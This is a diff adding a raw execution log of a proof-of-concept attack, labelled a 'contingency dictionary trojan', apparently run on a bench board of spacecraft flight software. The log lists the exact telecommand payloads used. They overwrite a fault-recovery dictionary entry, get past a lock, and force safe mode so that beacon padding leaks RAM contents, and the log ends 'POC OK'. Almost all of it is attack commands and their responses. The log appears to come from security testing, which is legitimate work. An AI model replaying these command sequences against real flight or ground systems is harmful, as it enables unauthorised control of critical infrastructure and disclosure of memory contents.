@@ -1,0 +1,223 @@
+[   0.000] ========================================================================
+[   0.000] V-20 FDIR contingency dictionary trojan
+[   0.000] ========================================================================
+[   1.518] --> HARD RESET (bench parity: fresh board per PoC)
+[   8.851] --> TC apid=0x0A via=usb AES  payload=00
+[   8.903] <-- TM apid=0x0A clear len=3
+[   8.954] --> TC apid=0x1D via=usb clear payload=0101
+[   9.006] <-- TM apid=0x1D clear len=4
+[   9.006] --> TC apid=0x11 via=usb clear payload=00
+[   9.466] <-- TM apid=0x11 clear len=9
+[   9.466] --> TC apid=0x15 via=usb clear payload=001005
+[   9.917] <-- TM apid=0x15 clear len=6
+[   9.917] --> TC apid=0x0D via=usb clear payload=01
+[  10.367] <-- TM apid=0x0D clear len=4
+[  10.408] --> TC apid=0x1D via=usb clear payload=03
+[  10.460] <-- TM apid=0x1D clear len=4
+[  10.460] <-- TM apid=0x09 clear len=9
+[  10.512] --> TC apid=0x1D via=usb clear payload=0a0258
+[  10.563] <-- TM apid=0x1D clear len=4
+[  10.563] --> TC apid=0x10 via=usb clear payload=00
+[  10.615] <-- TM apid=0x10 clear len=4
+[  10.615] --> TC apid=0x21 via=usb clear payload=00
+[  11.076] <-- TM apid=0x21 clear len=6
+[  11.076] --> TC apid=0x24 via=usb clear payload=0000
+[  11.117] <-- TM apid=0x24 clear len=8
+[  11.118] --> TC apid=0x24 via=usb clear payload=0100
+[  11.169] <-- TM apid=0x24 clear len=8
+[  11.169] --> TC apid=0x24 via=usb clear payload=0200
+[  11.210] <-- TM apid=0x24 clear len=8
+[  11.211] --> TC apid=0x24 via=usb clear payload=0300
+[  11.262] <-- TM apid=0x24 clear len=8
+[  11.262] --> TC apid=0x25 via=usb clear payload=0080
+[  11.314] <-- TM apid=0x25 clear len=4
+[  11.314] --> TC apid=0x1E via=usb clear payload=01
+[  11.826] <-- TM apid=0x1E clear len=5
+[  11.826] --> TC apid=0x1D via=usb clear payload=0b
+[  11.918] <-- TM apid=0x1D clear len=4
+[  11.918] --> TC apid=0x05 via=usb clear payload=12
+[  12.369] --> TC apid=0x1F via=usb clear payload=0600000000000000000000000700
+[  12.880] <-- TM apid=0x1F clear len=4
+[  12.880] --> TC apid=0x1F via=usb clear payload=05
+[  13.382] <-- TM apid=0x1F clear len=4
+[  13.382] --> TC apid=0x0A via=usb clear payload=01
+[  13.427] <-- TM apid=0x0A AES len=3
+[  21.557] --> TC apid=0x14 via=usb AES  payload=406c841500e055bb801a060008
+[  30.033] <-- TM apid=0x0E AES len=18
+[  30.033] --> REARM (bench parity: fresh board, pre-PoC)
+[  30.136] --> TC apid=0x1D via=usb AES  payload=0600
+[  30.187] <-- TM apid=0x1D clear len=8
+[  30.187] entry0: apid=0x04 payload=000000
+[  30.238] --> TC apid=0x1D via=usb AES  payload=050200210101
+[  30.340] <-- TM apid=0x1D clear len=6
+[  30.340] entry2 := APID 0x21 (PADDING_CONFIG) payload 01 -> leak padding
+[  30.392] --> TC apid=0x1D via=usb AES  payload=07
+[  30.494] <-- TM apid=0x1D clear len=12
+[  30.494] lock hash=394341f739174b0c locked=1
+[  30.536] --> TC apid=0x1D via=usb AES  payload=050200040100
+[  30.587] <-- TM apid=0x1D clear len=6
+[  30.639] --> TC apid=0x1D via=radio AES  payload=02
+[  30.691] <-- TM apid=0x21 clear len=6
+[  30.691] <-- TM apid=0x1D clear len=4
+[  30.794] --> TC apid=0x05 via=usb clear payload=01
+[  31.244] --> advance(3000 ms)
+[  34.306] <-- TM apid=0x27 clear len=4
+[  34.306] <-- TM apid=0x01 clear len=64
+[  34.306] <-- TM apid=0x01 clear len=64
+[  34.306] after safe entry beacon padding mode=1 -> 0000000000000000... (RAM leak active)
+[  34.306] --> advance(122000 ms)
+[ 156.319] <-- TM apid=0x27 clear len=4
+[ 156.319] <-- TM apid=0x27 clear len=4
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x08 clear len=20
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=8
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x0E clear len=30
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x08 clear len=20
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x3FF clear len=14
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=8
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x08 clear len=20
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x0E clear len=30
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x08 clear len=20
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x3FF clear len=14
+[ 156.319] <-- TM apid=0x01 clear len=8
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x0E clear len=30
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x08 clear len=20
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=8
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x08 clear len=20
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x0E clear len=30
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x3FF clear len=14
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x08 clear len=20
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=8
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x0E clear len=30
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x08 clear len=20
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.319] <-- TM apid=0x01 clear len=64
+[ 156.320] <-- TM apid=0x3FF clear len=14
+[ 156.320] <-- TM apid=0x01 clear len=8
+[ 156.320] <-- TM apid=0x01 clear len=64
+[ 156.320] <-- TM apid=0x01 clear len=64
+[ 156.320] <-- TM apid=0x01 clear len=64
+[ 156.320] <-- TM apid=0x01 clear len=64
+[ 156.320] <-- TM apid=0x01 clear len=64
+[ 156.320] --> TC apid=0x1D via=usb clear payload=03
+[ 156.340] <-- TM apid=0x1D clear len=4
+[ 156.391] --> TC apid=0x0C via=usb clear payload=-
+[ 156.443] <-- TM apid=0x0C clear len=27
+[ 156.495] -- console tail: [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [ERROR] Unpacking SPP: -1 | [ERROR] Unpacking SPP: -4 | [ERROR] Unpacking SPP: -1 | [ERROR] Unpacking SPP: -4 | [ERROR] Unpacking SPP: -1 | [TC - SPP] APID=0x027 SEQ=1 LEN=5 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x01D SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x00C SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO | [TC - SPP] APID=0x026 SEQ=1 LEN=1 FLAGS=1 SEC_HDR=NO
+[ 156.495] ========================================================================
+[ 156.495] POC OK
+[ 156.495] ========================================================================
